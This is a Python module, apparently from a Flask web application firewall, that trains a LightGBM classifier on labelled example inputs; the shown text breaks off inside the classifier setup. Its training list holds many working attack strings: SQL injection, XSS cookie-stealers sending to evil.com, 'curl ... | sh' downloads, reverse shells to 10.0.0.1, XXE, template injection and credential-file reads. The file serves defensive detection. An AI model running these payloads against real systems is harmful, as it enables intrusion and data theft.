"""
FlaskGuard - ML Classifier (LightGBM)
Trained on baseline payloads + real blocked attacks + admin feedback.
Supports periodic retraining from logs/attacks.json and logs/feedback.json.

Uses LightGBM with fallback to Random Forest for:
- Native sparse matrix support (TF-IDF output stays sparse, saves RAM)
- Leaf-wise tree growth (better accuracy than level-wise boosting)
- Fastest training and inference of any tree-based classifier
- Built-in L1/L2 regularization to prevent overfitting on small datasets
- Sub-millisecond inference per request (0.1-0.5ms)
"""

import json
import os
import pickle
import threading
import warnings
from datetime import datetime

from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics import accuracy_score, f1_score, precision_score, recall_score
from sklearn.model_selection import cross_val_score, train_test_split
from sklearn.pipeline import Pipeline

from flaskguard.config import get_storage_path

try:
    from lightgbm import LGBMClassifier

    _HAS_LIGHTGBM = True
except ImportError:
    _HAS_LIGHTGBM = False
    LGBMClassifier = None  # type: ignore[assignment]

warnings.filterwarnings("ignore", category=UserWarning)

# ═══════════════════════════════════════════════════════════════════
# BASELINE TRAINING DATA  (~580 samples)
# ═══════════════════════════════════════════════════════════════════

BASELINE_DATA = [
    # ─── NORMAL INPUTS (label=0) — 150 samples ─────────────────
    ("hello world", 0),
    ("hi there", 0),
    ("how are you", 0),
    ("good morning", 0),
    ("good afternoon", 0),
    ("good evening", 0),
    ("nice to meet you", 0),
    ("thank you very much", 0),
    ("please help me", 0),
    ("have a great day", 0),
    ("see you later", 0),
    ("welcome back", 0),
    ("congratulations on your success", 0),
    ("happy birthday alice", 0),
    ("merry christmas", 0),
    ("john doe", 0),
    ("jane smith", 0),
    ("robert johnson", 0),
    ("emily davis", 0),
    ("michael brown", 0),
    ("sarah wilson", 0),
    ("david miller", 0),
    ("jessica taylor", 0),
    ("christopher anderson", 0),
    ("amanda thomas", 0),
    ("daniel jackson", 0),
    ("search query", 0),
    ("product search laptop", 0),
    ("best smartphones 2026", 0),
    ("cheap flights to paris", 0),
    ("how to learn python", 0),
    ("best restaurants near me", 0),
    ("weather forecast today", 0),
    ("news about technology", 0),
    ("download free ebook", 0),
    ("movie recommendations", 0),
    ("python tutorial beginner", 0),
    ("buy nike shoes online", 0),
    ("admin login", 0),
    ("user login page", 0),
    ("forgot my password", 0),
    ("reset password email", 0),
    ("create new account", 0),
    ("sign up form", 0),
    ("my username is alice", 0),
    ("username bob123", 0),
    ("password reset link", 0),
    ("verify email address", 0),
    ("two factor authentication", 0),
    ("order number 12345", 0),
    ("track my package", 0),
    ("order status pending", 0),
    ("cancel order 98765", 0),
    ("shipping address update", 0),
    ("apply coupon code SAVE20", 0),
    ("payment method credit card", 0),
    ("refund request order", 0),
    ("add to cart", 0),
    ("checkout now", 0),
    ("invoice download pdf", 0),
    ("contact form message", 0),
    ("customer support ticket", 0),
    ("feedback about service", 0),
    ("complaint regarding order", 0),
    ("request callback", 0),
    ("live chat support", 0),
    ("technical help needed", 0),
    ("report a bug", 0),
    ("feature request dark mode", 0),
    ("email@example.com", 0),
    ("user@gmail.com", 0),
    ("contact@company.org", 0),
    ("support@helpdesk.net", 0),
    ("admin@localhost", 0),
    ("john.doe@enterprise.co.uk", 0),
    ("reach me at hello@world.io", 0),
    ("123 main street", 0),
    ("apartment 4b new york", 0),
    ("postal code 10001", 0),
    ("san francisco california", 0),
    ("united kingdom london", 0),
    ("hello world program", 0),
    ("python print function", 0),
    ("javascript array methods", 0),
    ("css flexbox tutorial", 0),
    ("html div element", 0),
    ("api documentation rest", 0),
    ("json parse example", 0),
    ("docker container run", 0),
    ("git commit message", 0),
    ("npm install package", 0),
    ("january 15 2026", 0),
    ("meeting at 3pm", 0),
    ("deadline tomorrow", 0),
    ("schedule appointment", 0),
    ("reminder call dentist", 0),
    ("version 2.5.1", 0),
    ("page 42 of document", 0),
    ("chapter 3 summary", 0),
    ("price 99.99 dollars", 0),
    ("quantity 5 items", 0),
    ("great post thanks", 0),
    ("i agree with you", 0),
    ("what do you think", 0),
    ("can you explain more", 0),
    ("this is helpful", 0),
    ("followed your advice", 0),
    ("upvoted your comment", 0),
    ("subscribed to newsletter", 0),
    ("profile picture upload", 0),
    ("bio software engineer", 0),
    ("normal user input", 0),
    ("select a country from list", 0),
    ("delete my account please", 0),
    ("insert coin to continue", 0),
    ("drop down menu selection", 0),
    ("terms and conditions", 0),
    ("privacy policy page", 0),
    ("about us company info", 0),
    ("careers job opening", 0),
    ("blog latest articles", 0),
    ("faq frequently asked", 0),
    ("sitemap xml", 0),
    ("robots txt file", 0),
    ("home page welcome", 0),
    ("logout session end", 0),
    ("welcome to my website", 0),
    ("submit button clicked", 0),
    ("remember me checkbox", 0),
    ("dark mode enabled", 0),
    ("notifications turned off", 0),
    ("language changed to english", 0),
    ("timezone set to utc", 0),
    ("avatar updated successfully", 0),
    ("password changed yesterday", 0),
    ("session expired please login", 0),
    ("cookies accepted", 0),
    ("gdpr consent given", 0),
    ("newsletter unsubscribed", 0),
    ("account deactivated", 0),
    ("phone number verified", 0),
    ("backup codes generated", 0),
    ("api key regenerated", 0),
    ("webhook configured", 0),
    ("integration connected", 0),
    ("export data requested", 0),
    ("billing cycle monthly", 0),
    ("upgrade to premium", 0),
    ("downgrade plan confirm", 0),
    ("team member invited", 0),
    ("role changed to admin", 0),
    ("project archived", 0),
    ("task marked complete", 0),
    ("comment added successfully", 0),
    ("file uploaded to cloud", 0),
    ("link shared with team", 0),
    ("notification sent", 0),
    ("settings saved", 0),
    ("profile updated", 0),
    # ─── NORMAL INPUTS WITH SPECIAL CHARS (label=0) ──
    # These teach the model that ; , : { } are not always attacks
    ("hello; world", 0),
    ("foo, bar, baz", 0),
    ("subject: meeting tomorrow", 0),
    ("note: please review", 0),
    ("apples, oranges, bananas", 0),
    ("option a; option b; option c", 0),
    ("1, 2, 3, 4, 5", 0),
    ("a; b; c; d; e", 0),
    ("colors: red, green, blue", 0),
    ("status: pending review", 0),
    ("tags: python, flask, ml", 0),
    ("size: large, color: red, qty: 5", 0),
    ("lorem; ipsum; dolor; sit; amet", 0),
    ("item1, item2, item3, item4", 0),
    ("category: electronics, price: 99.99", 0),
    ("name: john, age: 30, city: paris", 0),
    ("todo: buy milk, eggs, bread", 0),
    ("language: python; framework: flask; db: sqlite", 0),
    ("key: value; key2: value2", 0),
    ("x: 10, y: 20, z: 30", 0),
    ("from: alice, to: bob, subject: hello", 0),
    ("priority: high; status: open; assignee: me", 0),
    ("first, second, third, fourth", 0),
    ("a:1, b:2, c:3, d:4", 0),
    ("product: laptop, brand: dell, ram: 16gb", 0),
    ("filter: date, sort: asc, page: 1", 0),
    ("{placeholder text}", 0),
    ("use {variable} in template", 0),
    ("{name} and {email} are required", 0),
    ("the set {1, 2, 3} is valid", 0),
    ("json keys: name, email, phone", 0),
    ("just some random; text with commas, and colons: here", 0),
    ("random keyboard spam: asdf;hjkl", 0),
    ("typing test: the quick brown fox; jumps over", 0),
    ("error: file not found; path: /home/user/doc.txt", 0),
    ("warning: disk space low; available: 2gb", 0),
    ("info: server restarted; uptime: 5 days", 0),
    ("debug: variable x=42, y=null", 0),
    ("log: user logged in; ip: 192.168.1.1", 0),
    ("trace: function called; args: (a, b, c)", 0),
    ("csv: id,name,email,phone", 0),
    ("data: 1,test,test@test.com,555-0100", 0),
    ("export: id;name;email;department", 0),
    ("delimited by: semicolon; data here; more data", 0),
    ("gibberish input test: asdfghjkl", 0),
    ("random typing: qwertyuiop", 0),
    ("keyboard smash: asdf;lkj", 0),
    ("test message: hello; this is a test, ok?", 0),
    ("feedback: great product; will buy again; thanks", 0),
    # ─── SQL INJECTION (label=1) — 100 samples ─────────────────
    # Classic tautologies
    ("' OR '1'='1", 1),
    ("' OR '1'='1' --", 1),
    ("' OR '1'='1' /*", 1),
    ("' OR 1=1 --", 1),
    ("' OR 1=1#", 1),
    ("' OR 1=1/*", 1),
    ("' OR 1=1 OR '1'='1", 1),
    ("1' OR '1'='1", 1),
    ("1' OR 1 --", 1),
    ("1' AND 1=1 --", 1),
    ("1' AND 1=2 --", 1),
    ("'=''or'", 1),
    ("' OR ''='", 1),
    ("' OR 'x'='x", 1),
    # Comment variations
    ("admin'--", 1),
    ("admin' #", 1),
    ("admin'/*", 1),
    ("'--", 1),
    ("' #", 1),
    ("'/*", 1),
    ("1'--", 1),
    ("1' #", 1),
    ("1'/*", 1),
    (";--", 1),
    (";#", 1),
    (";/*", 1),
    # UNION based
    ("UNION SELECT null--", 1),
    ("UNION SELECT null,null--", 1),
    ("UNION SELECT null,null,null--", 1),
    ("UNION SELECT password FROM users--", 1),
    ("UNION ALL SELECT NULL,NULL--", 1),
    ("UNION SELECT username,password FROM admin--", 1),
    ("UNION SELECT 1,2,3,4--", 1),
    ("UNION SELECT @@version--", 1),
    ("UNION SELECT table_name FROM information_schema.tables--", 1),
    ("UNION SELECT column_name FROM information_schema.columns--", 1),
    ("UNION SELECT load_file('/etc/passwd')--", 1),
    ("' UNION SELECT * FROM users--", 1),
    ("1 UNION SELECT null,version()--", 1),
    # Stacked queries
    ("; DROP TABLE users--", 1),
    ("; DELETE FROM accounts--", 1),
    ("; INSERT INTO admin VALUES('hack','pass')--", 1),
    ("; UPDATE users SET password='hacked'--", 1),
    ("; EXEC master..xp_cmdshell 'dir'--", 1),
    ("; SHUTDOWN--", 1),
    ("1; DELETE FROM accounts", 1),
    ("1; DROP TABLE customers--", 1),
    # Time-based blind
    ("' AND SLEEP(5)--", 1),
    ("' AND SLEEP(10)--", 1),
    ("' WAITFOR DELAY '0:0:5'--", 1),
    ("'; WAITFOR DELAY '0:0:10'--", 1),
    ("1 OR BENCHMARK(5000000,MD5(1))", 1),
    ("1 AND BENCHMARK(10000000,SHA1(1))", 1),
    ("' AND pg_sleep(5)--", 1),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 1),
    # Boolean-based blind
    ("' AND 1=1--", 1),
    ("' AND 1=2--", 1),
    ("' AND 'a'='a", 1),
    ("' AND 'a'='b", 1),
    ("' AND substring(@@version,1,1)='5'", 1),
    ("' AND ASCII(SUBSTRING((SELECT password FROM users),1,1))>50", 1),
    # Error-based
    ("' AND 1=CONVERT(int,(SELECT @@version))--", 1),
    ("' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version))--", 1),
    ("' AND 1=(SELECT COUNT(*) FROM tablenames) --", 1),
    # Out-of-band
    ("; EXEC master..xp_dirtree '\\\\attacker.com\\share'--", 1),
    (
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users),'.attacker.com\\a.txt'))--",
        1,
    ),
    # WAF evasion / encoding
    ("%27%20OR%20%271%27%3D%271", 1),
    ("%27%20OR%201%3D1--", 1),
    ("'+OR+'1'='1", 1),
    ("'/**/OR/**/1=1", 1),
    ("' OR 1=1 LIMIT 1--", 1),
    ("' OR 1=1 OFFSET 0--", 1),
    ("'||'1'='1", 1),
    ("' OR '1' LIKE '1", 1),
    ("' OR 1 GROUP BY users.id HAVING 1=1--", 1),
    ("' HAVING 1=1--", 1),
    ("' ORDER BY 1--", 1),
    ("' ORDER BY 10--", 1),
    ("' INTO OUTFILE '/var/www/shell.php'--", 1),
    ("' INTO DUMPFILE '/tmp/shell'--", 1),
    # Second-order / stored
    ("; INSERT INTO logs VALUES((SELECT password FROM admin))--", 1),
    # MSSQL specific
    ("' EXEC xp_cmdshell('dir')--", 1),
    ("' EXEC xp_cmdshell('net user')--", 1),
    ("' EXEC sp_configure 'xp_cmdshell', 1--", 1),
    ("' EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'", 1),
    # MySQL specific
    ("' SELECT LOAD_FILE('/etc/passwd')--", 1),
    ("' SELECT * INTO OUTFILE '/tmp/test'--", 1),
    ("' SHOW TABLES--", 1),
    ("' SHOW DATABASES--", 1),
    ("' DESCRIBE users--", 1),
    # PostgreSQL specific
    ("; COPY (SELECT '') TO PROGRAM 'id'--", 1),
    ("; CREATE TEMP TABLE x(cmd text); COPY x FROM PROGRAM 'id'--", 1),
    # Oracle specific
    ("' SELECT * FROM all_tables--", 1),
    ("' SELECT UTL_INADDR.get_host_name((SELECT password FROM users)) FROM dual--", 1),
    ("' SELECT DBMS_PIPE.receive_message(('a'),10) FROM dual--", 1),
    # ─── XSS / HTML INJECTION (label=1) — 100 samples ──────────
    # Basic script tags
    ("<script>alert('xss')</script>", 1),
    ("<script>alert(1)</script>", 1),
    ("<script>alert(document.cookie)</script>", 1),
    ("<script>alert(window.location)</script>", 1),
    ("<script>confirm('xss')</script>", 1),
    ("<script>prompt('xss')</script>", 1),
    ("<script>document.write('hacked')</script>", 1),
    ("<script>eval('alert(1)')</script>", 1),
    ("<script>fetch('http://evil.com?c='+document.cookie)</script>", 1),
    # Event handlers
    ("<img src=x onerror=alert(1)>", 1),
    ("<img src=x onerror=alert('xss')>", 1),
    ("<img src=1 onerror=alert(document.cookie)>", 1),
    ("<body onload=alert(1)>", 1),
    ("<svg onload=alert(1)>", 1),
    ("<svg onload=alert('xss')>", 1),
    ("<input onfocus=alert(1) autofocus>", 1),
    ("<button onclick=alert(1)>click</button>", 1),
    ("<a href=javascript:alert(1)>link</a>", 1),
    ("<div onmouseover=alert(1)>hover me</div>", 1),
    ("<iframe onload=alert(1) src=about:blank>", 1),
    ("<video><source onerror=alert(1)>", 1),
    ("<audio src=x onerror=alert(1)>", 1),
    ("<marquee onstart=alert(1)>", 1),
    ("<details open ontoggle=alert(1)>", 1),
    ("<select onchange=alert(1)><option>1</option><option>2</option></select>", 1),
    # JavaScript pseudo-protocol
    ("javascript:alert(1)", 1),
    ("javascript:void(0)", 1),
    ("javascript:alert(document.cookie)", 1),
    ("javascript:eval(atob('YWxlcnQoMSk='))", 1),
    ("jav&#x09;ascript:alert(1)", 1),
    ("data:text/html,<script>alert(1)</script>", 1),
    # iframe / object
    ("<iframe src=javascript:alert('XSS')>", 1),
    ("<iframe src='javascript:alert(1)'>", 1),
    ("<iframe srcdoc='<script>alert(1)</script>'>", 1),
    ("<object data=javascript:alert(1)>", 1),
    ("<embed src=javascript:alert(1)>", 1),
    # Encoded / obfuscated
    ("<scr ipt>alert(1)</scr ipt>", 1),
    ("<script >alert(1)</script >", 1),
    ("<sCrIpT>alert(1)</ScRiPt>", 1),
    ("&#60;script&#62;alert(1)&#60;/script&#62;", 1),
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E", 1),
    ("<script>alert(String.fromCharCode(88,83,83))</script>", 1),
    ("<script>alert(String.fromCharCode(97,108,101,114,116))</script>", 1),
    ("<script>alert(/xss/.source)</script>", 1),
    # SVG / math
    ("<svg><script>alert(1)</script></svg>", 1),
    (
        "<svg><a xlink:href=javascript:alert(1)><rect width=100 height=100 /></a></svg>",
        1,
    ),
    ("<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", 1),
    # Template injection style
    ("{{constructor.constructor('alert(1)')()}}", 1),
    ("${alert(1)}", 1),
    ("<%= 7*7 %>", 1),
    ("#{7*7}", 1),
    # Polyglot / mixed
    ("'\"><script>alert(1)</script>", 1),
    ("'\"><img src=x onerror=alert(1)>", 1),
    ("';alert('XSS')//", 1),
    ('"><script>alert(1)</script>', 1),
    ("</textarea><script>alert(1)</script>", 1),
    ("</title><script>alert(1)</script>", 1),
    ("--><script>alert(1)</script>", 1),
    ("]]><script>alert(1)</script>", 1),
    # DOM-based vectors
    ("#<img src=x onerror=alert(1)>", 1),
    ("?name=<script>alert(1)</script>", 1),
    ("<img src=1 onerror=alert(1) onload=alert(2)>", 1),
    # Cookie / session theft
    (
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        1,
    ),
    ("<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>", 1),
    # Keyloggers / BeEF style
    (
        "<script>document.onkeypress=function(e){fetch('http://evil.com/?k='+e.key)}</script>",
        1,
    ),
    # Angular / Vue / React specific
    ("{{constructor.constructor('alert(1)')()}}", 1),
    ("{{_openBlock.constructor('alert(1)')()}}", 1),
    ("{constructor:alert(1)}", 1),
    # ─── PATH TRAVERSAL / LFI (label=1) — 60 samples ───────────
    ("../../etc/passwd", 1),
    ("../../../etc/passwd", 1),
    ("../../../../etc/passwd", 1),
    ("../../../../../etc/passwd", 1),
    ("..\\..\\windows\\system32", 1),
    ("..\\..\\..\\windows\\system32\\config\\sam", 1),
    ("..\\..\\..\\..\\windows\\win.ini", 1),
    ("%2e%2e%2fetc%2fpasswd", 1),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", 1),
    ("%252e%252e%252fetc%252fpasswd", 1),
    ("..%2f..%2fetc%2fpasswd", 1),
    ("..%252f..%252fetc%252fpasswd", 1),
    ("/etc/passwd", 1),
    ("/etc/shadow", 1),
    ("/etc/hosts", 1),
    ("/etc/group", 1),
    ("/proc/self/environ", 1),
    ("/proc/self/cmdline", 1),
    ("/proc/self/status", 1),
    ("/proc/1/status", 1),
    ("/proc/1/environ", 1),
    ("/var/log/apache2/access.log", 1),
    ("/var/log/nginx/access.log", 1),
    ("/var/www/html/index.php", 1),
    ("/usr/local/etc/php.ini", 1),
    ("/windows/system32/drivers/etc/hosts", 1),
    ("/windows/win.ini", 1),
    ("/windows/system32/config/sam", 1),
    ("c:\\windows\\system32\\config\\sam", 1),
    ("c:/windows/system32/config/sam", 1),
    ("....//....//etc/passwd", 1),
    ("....\\....\\windows\\win.ini", 1),
    ("..%00/../etc/passwd", 1),
    ("../../../etc/passwd%00.jpg", 1),
    ("../../etc/passwd%00", 1),
    ("/index.php?page=../../../../etc/passwd", 1),
    ("?page=../../../../../../etc/passwd", 1),
    ("?file=../../config.php", 1),
    ("?include=../../../../etc/shadow", 1),
    ("?path=../../../boot.ini", 1),
    ("?template=../../../../../../etc/passwd", 1),
    ("?document=../secret.txt", 1),
    ("?action=../../../../etc/passwd", 1),
    ("?module=../../../../etc/passwd", 1),
    ("../../etc/passwd\x00.png", 1),
    ("../../../etc/passwd\x00.jpg", 1),
    ("..%00/..%00/..%00/etc/passwd", 1),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", 1),
    ("%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", 1),
    ("/var/log/httpd/access_log", 1),
    ("/var/log/apache/access.log", 1),
    ("/var/log/vsftpd.log", 1),
    ("/var/log/ftp-proxy/ftp-proxy.log", 1),
    ("/var/log/mail.log", 1),
    ("/var/log/auth.log", 1),
    ("/var/log/syslog", 1),
    ("php://filter/read=convert.base64-encode/resource=index.php", 1),
    ("php://filter/resource=../../../../etc/passwd", 1),
    ("expect://id", 1),
    ("input://", 1),
    ("data://text/plain,<?php phpinfo(); ?>", 1),
    # ─── COMMAND INJECTION (label=1) — 60 samples ──────────────
    ("; ls -la", 1),
    ("; ls", 1),
    ("; dir", 1),
    ("; cat /etc/passwd", 1),
    ("| cat /etc/passwd", 1),
    ("| ls -la", 1),
    ("| dir", 1),
    ("| whoami", 1),
    ("| id", 1),
    ("| net user", 1),
    ("`whoami`", 1),
    ("`id`", 1),
    ("`ls -la`", 1),
    ("`cat /etc/passwd`", 1),
    ("$(whoami)", 1),
    ("$(id)", 1),
    ("$(ls -la)", 1),
    ("$(cat /etc/passwd)", 1),
    ("$(rm -rf /)", 1),
    ("& wget http://malicious.com/shell.sh", 1),
    ("& curl http://evil.com/backdoor | sh", 1),
    ("&& whoami", 1),
    ("&& ls -la", 1),
    ("&& cat /etc/passwd", 1),
    ("&& id", 1),
    ("|| whoami", 1),
    ("|| ls -la", 1),
    ("|| cat /etc/passwd", 1),
    # Subshell variations
    ("; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", 1),
    ("; nc -e /bin/sh 10.0.0.1 4444", 1),
    (
        '; python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        1,
    ),
    (
        '; perl -e \'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
        1,
    ),
    (
        '; ruby -rsocket -e\'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        1,
    ),
    # System commands
    ("; uname -a", 1),
    ("; ps aux", 1),
    ("; netstat -an", 1),
    ("; ifconfig", 1),
    ("; ipconfig /all", 1),
    ("; tasklist", 1),
    ("; systeminfo", 1),
    ("; pwd", 1),
    ("; echo hacked", 1),
    ("; printenv", 1),
    ("; env", 1),
    ("; getent passwd", 1),
    ("; cat /proc/version", 1),
    ("; dmesg", 1),
    # Chaining
    ("; id; whoami; ls -la", 1),
    ("| id | whoami", 1),
    ("`id` `whoami`", 1),
    ("$(id)$(whoami)", 1),
    # Alternative syntax
    ("; exec /bin/sh", 1),
    ("; /bin/sh -c 'id'", 1),
    ("; sh -i", 1),
    ("; cmd.exe /c dir", 1),
    ("; cmd /c whoami", 1),
    ("& ping -c 4 127.0.0.1", 1),
    ("| ping 127.0.0.1", 1),
    # Time-based
    ("; sleep 5", 1),
    ("; sleep 10", 1),
    ("| sleep 5", 1),
    ("`sleep 5`", 1),
    ("$(sleep 5)", 1),
    # ─── FILE INJECTION / RFI (label=1) — 50 samples ───────────
    ("php://input", 1),
    ("data://text/plain,<?php echo 1; ?>", 1),
    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", 1),
    ("require(http://evil.example/shell.php)", 1),
    ("include(http://evil.com/backdoor.txt)", 1),
    ("include 'http://attacker.com/shell.txt'", 1),
    ("file_get_contents('http://evil.com/steal?c=')", 1),
    ("readfile('http://attacker.com/malicious.php')", 1),
    ("fopen('http://evil.com/shell.php', 'r')", 1),
    ("php://filter/read=string.rot13/resource=config.php", 1),
    ("php://filter/convert.base64-encode/resource=admin.php", 1),
    ("zip://archive.zip%23shell.php", 1),
    ("compress.zlib://data:text/plain;base64,cm9vdA==", 1),
    ("expect://ls", 1),
    ("expect://cat /etc/passwd", 1),
    ("ogg://data:text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", 1),
    # Remote file inclusion vectors
    ("?page=http://evil.com/shell", 1),
    ("?file=http://attacker.com/rfi.txt", 1),
    ("?path=http://evil.com/backdoor.php", 1),
    ("?template=http://malicious.com/template", 1),
    ("?document=http://evil.com/doc", 1),
    ("?module=http://attacker.com/mod", 1),
    ("?view=http://evil.com/page", 1),
    ("?load=http://malicious.com/code", 1),
    ("?resource=http://evil.com/res", 1),
    # SSRF-style file reads
    ("file:///etc/passwd", 1),
    ("file:///C:/windows/win.ini", 1),
    ("file://localhost/etc/passwd", 1),
    ("dict://localhost:11211/stat", 1),
    ("gopher://localhost:9000/_test", 1),
    ("ftp://anonymous@evil.com/pub/shell", 1),
    ("http://169.254.169.254/latest/meta-data/", 1),
    ("http://127.0.0.1:80/admin", 1),
    ("http://localhost:8080/manager", 1),
    ("http://0.0.0.0:22/", 1),
    # Upload bypass
    ("shell.php.jpg", 1),
    ("shell.php5", 1),
    ("shell.phtml", 1),
    ("shell.php%00.jpg", 1),
    ("shell.jpg.php", 1),
    ("shell.php;.jpg", 1),
    (".htaccess", 1),
    (".bash_history", 1),
    (".ssh/id_rsa", 1),
    (".env", 1),
    ("config.yml", 1),
    ("database.yml", 1),
    ("settings.json", 1),
    ("web.config", 1),
    # ─── NOSQL INJECTION (label=1) — 20 samples ────────────────
    ("{'$gt': ''}", 1),
    ("{'$ne': null}", 1),
    ("{'$exists': true}", 1),
    ("{'$where': 'this.password.length > 0'}", 1),
    ("{'$regex': '.*'}", 1),
    ("{'username': {'$ne': null}, 'password': {'$ne': null}}", 1),
    ("{'username': 'admin', 'password': {'$gt': ''}}", 1),
    ("username[$ne]=admin&password[$ne]=", 1),
    ("username[$regex]=.*&password[$regex]=.*", 1),
    ("{'$or': [{'username': 'admin'}, {'username': 'administrator'}]}", 1),
    ("; it.toArray(); //", 1),
    ("admin' || '1'=='1", 1),
    ("true, $where: '1 == 1'", 1),
    (", $or: [ {}, {'a':'a', 'b':'b'} ], $comment:'successful MongoDB injection'", 1),
    ("db.collection.find({$where: function() {return true}})", 1),
    ("db.users.findOne({username: {$gt: ''}})", 1),
    ("{'$query': {}, '$maxTimeMS': 1000}", 1),
    ("{'$text': {'$search': 'anything'}}", 1),
    # ─── XML / XXE INJECTION (label=1) — 20 samples ────────────
    ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", 1),
    (
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///C:/windows/win.ini'>]><root>&xxe;</root>",
        1,
    ),
    (
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/steal'>]><foo>&xxe;</foo>",
        1,
    ),
    (
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'>%xxe;]><foo></foo>",
        1,
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        1,
    ),
    (
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        1,
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        1,
    ),
    (
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/test.txt">]><foo>&xxe;</foo>',
        1,
    ),
    (
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
        1,
    ),
    (
        '<foo><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">&xxe;</foo>',
        1,
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
        1,
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><doc>&xxe;</doc>',
        1,
    ),
    (
        '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
        1,
    ),
    ("' or '1'='1", 1),
    ("' or ''='", 1),
    ("1 or 1=1", 1),
    ("//users/user[login/text()='' or '1'='1' and password/text()='']", 1),
    ("//user[username/text()='admin' or 1=1 and password/text()='anything']", 1),
    ("'] | //user/*[contains(.,'a')] | //foo[('", 1),
    ("count(/child::node()), 2, 3)", 1),
    ("/users/user[1]/password | /users/user[2]/password", 1),
    # ─── LDAP INJECTION (label=1) — 20 samples ─────────────────
    ("*)(uid=*))(&(uid=*", 1),
    ("*)(objectClass=*))(&(objectClass=*", 1),
    ("admin)(&))", 1),
    ("*)(uid=*))(|(uid=*", 1),
    ("*)(|(mail=*))", 1),
    ("*)(|(objectClass=*))", 1),
    ("admin*))(&(uid=*", 1),
    ("*)(sn=*))(&(sn=*", 1),
    ("*)(&(uid=*)))(uid=*", 1),
    ("*))(|(uid=*", 1),
    ("admin)(objectClass=*))(&(objectClass=*", 1),
    ("*)(uid=*))(&(uid=*", 1),
    ('*)(uid=*"))((uid=*', 1),
    ("*)(uid=*))", 1),
    ('*)(objectClass=*"))((objectClass=*', 1),
    ("admin)(!(uid=*))", 1),
    ("*)(&(uid=*)))", 1),
    ('*)(uid=*))(&(uid=*"))((uid=*', 1),
    ("*)(uid=*))(&(uid=*", 1),
    ("*)(objectClass=*))(&(objectClass=*", 1),
    # ─── SSI / TEMPLATE INJECTION (label=1) — 25 samples ───────
    ('<!--#exec cmd="id" -->', 1),
    ('<!--#exec cmd="ls -la" -->', 1),
    ('<!--#exec cmd="cat /etc/passwd" -->', 1),
    ('<!--#include file="/etc/passwd" -->', 1),
    ('<!--#include virtual="/cgi-bin/counter.pl" -->', 1),
    ('<!--#echo var="HTTP_USER_AGENT" -->', 1),
    ('<!--#echo var="DOCUMENT_URI" -->', 1),
    ('<!--#fsize file="/etc/passwd" -->', 1),
    ('<!--#flastmod file="/etc/passwd" -->', 1),
    ("<!--#printenv -->", 1),
    ("{{7*7}}", 1),
    ("{{config.items()}}", 1),
    ("{{self.__init__.__globals__}}", 1),
    ("{{request.application.__globals__}}", 1),
    (
        "{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{% endif %}{% endfor %}",
        1,
    ),
    ("{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", 1),
    ("{{()}}", 1),
    ("{{3*3}}", 1),
    ("{{1/0}}", 1),
    ("{{7*'7'}}", 1),
    ("<%= 7*7 %>", 1),
    ("<%= File.open('/etc/passwd').read %>", 1),
    ("<%= system('id') %>", 1),
    ("<%= `whoami` %>", 1),
    ("{{''.class.mro()[2].subclasses()[40]('/etc/passwd').read()}}", 1),
]

# ─── Classifier Factory ────────────────────────────────────────────


def _make_classifier():
    """Return the best available classifier (LightGBM > Random Forest)."""
    if _HAS_LIGHTGBM:
        return LGBMClassifier(
            n_estimators=100,
            max_depth=5,
            num_leaves=31,
            learning_rate=0.08,
            min_child_samples=20,
            subsample=0.8,
            colsample_bytree=0.6,
            reg_alpha=2.0,
            reg_lambda=2.0,
